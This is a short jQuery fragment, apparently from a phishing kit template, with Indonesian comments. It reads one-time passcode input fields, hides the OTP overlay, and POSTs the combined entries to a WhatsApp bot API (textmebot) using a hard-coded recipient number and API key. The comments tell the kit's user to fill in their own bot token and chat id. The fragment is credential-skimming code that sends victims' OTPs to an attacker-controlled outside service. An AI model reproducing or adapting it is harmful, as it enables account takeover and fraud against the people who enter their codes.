...
$('.inpotp').on('input', function(event) {const inputs = $('.inpotp');
...
$(".bgotp").hide();    
   ...
   var token = '+6287767918949'; // Ganti dengan token bot yang kamu buat
    var grup = 'B3tC6xuRSK2J'; // Ganti dengan chat id dari bot yang kamu buat


    $.ajax({
        url: `http://api.textmebot.com/send.php?recipient=${token}&apikey=${grup}&text=${gabungan}&parse_mode=html`,
        method: `POST`,
